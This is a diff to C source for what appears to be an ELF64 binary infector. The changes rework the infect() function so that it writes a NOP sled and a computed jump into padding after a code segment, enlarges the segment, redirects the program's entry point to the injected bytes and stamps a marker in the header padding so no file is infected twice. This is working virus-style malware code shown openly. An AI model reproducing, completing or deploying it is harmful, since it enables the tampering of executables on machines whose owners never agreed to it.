@@ -6,8 +6,8 @@
 
 #define RET_PATTERN 0xfffffffc
 
-#define REQ_SIZE	0x9
-#define PAY			("\x90\x90\x90\x90\xe9\xf7\xfc\xff\xff")
+//#define REQ_SIZE	0x9
+//#define PAY			("\x90\x90\x90\x90\xe9\xf7\xfc\xff\xff")
 
 #define DEBUG 	1
 
@@ -157,14 +157,6 @@ typedef struct elf64_phdr {
 #define PF_R		0x4
 #define PF_W		0x2
 #define PF_X		0x1
-
-#define SHN_UNDEF	0
-#define SHN_LORESERVE	0xff00
-#define SHN_LOPROC	0xff00
-#define SHN_HIPROC	0xff1f
-#define SHN_ABS		0xfff1
-#define SHN_COMMON	0xfff2
-#define SHN_HIRESERVE	0xffff
 
 // end elf.h
 
@@ -1385,6 +1377,11 @@ int infect(const char* fpath)
 
 	Elf64_Ehdr* header = (Elf64_Ehdr*)victim;
 
+	if(header->e_ident[EI_PAD + 2] == 0xAC && header->e_ident[EI_PAD + 3] == 0x3D && header->e_ident[EI_PAD + 4] == 0xC0 && header->e_ident[EI_PAD + 5] == 0xDE) {
+		close(victim_fd);
+		return 0;
+	}
+
 	//Elf64_Addr ep = header->e_entry;
 
 	Elf64_Phdr* pHeader[header->e_phnum];
@@ -1445,30 +1442,66 @@ int infect(const char* fpath)
 	//Elf64_Xword padsize;
 
 	padding = pHeader[textseg - 1]->p_offset + pHeader[textseg - 1]->p_filesz;
-	if( REQ_SIZE > pHeader[textseg]->p_offset - padding) {
+	
+	int offset = padding + 9 - header->e_entry;
+	char tmp_offset[32];
+	tmp_offset[0] = '\x90';
+	tmp_offset[1] = '\x90';
+	tmp_offset[2] = '\x90';
+	tmp_offset[3] = '\x90';
+	tmp_offset[4] = '\xe9';
+
+	if( offset < 0 ) {
+		offset = -offset;
+		for(int i = 0 ; i < 4 ; i++) {
+			tmp_offset[5+i] = (char)(offset & 0x000000ff);
+			offset = offset >> 8;
+		}
+		
+	} else {
+		offset = 0x0fffffff - offset + 1;
+		for(int i = 0 ; i < 4 ; i++) {
+			tmp_offset[5+i] = (char)(offset & 0x000000ff);
+			offset = offset >> 8;
+		}
+		tmp_offset[8] = '\xff';
+	}
+
+	if( my_strlen(tmp_offset) > pHeader[textseg]->p_offset - padding) {
 		close(victim_fd);
 		return -1;
 	}
-	if(DEBUG) {
-		write(1, "text : seg[", my_strlen("text : seg["));
-		char tmp_index[8];
-		itoa(textseg, tmp_index, 10);
-		write(1, tmp_index, my_strlen(tmp_index));
-		write(1, "]\n", 2);
-		write(1,"found padding : ", my_strlen("found padding : "));
-		char tmp_padding[128];
-		itoa(padding, tmp_padding, 16);
-		write(1, tmp_padding, my_strlen(tmp_padding));
-		write(1, "\n", 1);
-	}
 
-	my_memmove(victim + padding, PAY, REQ_SIZE);
+	// if(DEBUG) {
+	// 	write(1, "text : seg[", my_strlen("text : seg["));
+	// 	char tmp_index[8];
+	// 	itoa(textseg, tmp_index, 10);
+	// 	write(1, tmp_index, my_strlen(tmp_index));
+	// 	write(1, "]\n", 2);
+	// 	write(1,"found padding : ", my_strlen("found padding : "));
+	// 	char tmp_padding[128];
+	// 	itoa(padding, tmp_padding, 16);
+	// 	write(1, tmp_padding, my_strlen(tmp_padding));
+	// 	write(1, "\n", 1);
+	// 	write(1,"jmp offset : ", my_strlen("jmp offset : "));
+		//unsigned int offset = padding + REQ_SIZE - header->e_entry;
+		//offset = 0x0fffffff - offset + 1;
+		//char tmp_offset[32];
+		//itoa(offset, tmp_offset, 16);
+	// 	write(1, tmp_offset, my_strlen(tmp_offset));
+	// 	write(1, "\n", 1);
+	// }
 
-	pHeader[textseg - 1]->p_filesz += REQ_SIZE;
-	pHeader[textseg - 1]->p_memsz += REQ_SIZE;
+	my_memmove(victim + padding, tmp_offset, my_strlen(tmp_offset));
+
+	pHeader[textseg - 1]->p_filesz += my_strlen(tmp_offset);
+	pHeader[textseg - 1]->p_memsz += my_strlen(tmp_offset);
 	header->e_entry = (unsigned long)(pHeader[textseg - 1]->p_vaddr + padding);
 
-
+	header->e_ident[EI_PAD + 2] = 0xAC;
+	header->e_ident[EI_PAD + 3] = 0x3D;
+	header->e_ident[EI_PAD + 4] = 0xC0;
+	header->e_ident[EI_PAD + 5] = 0xDE;
 
 	close(victim_fd);
 	
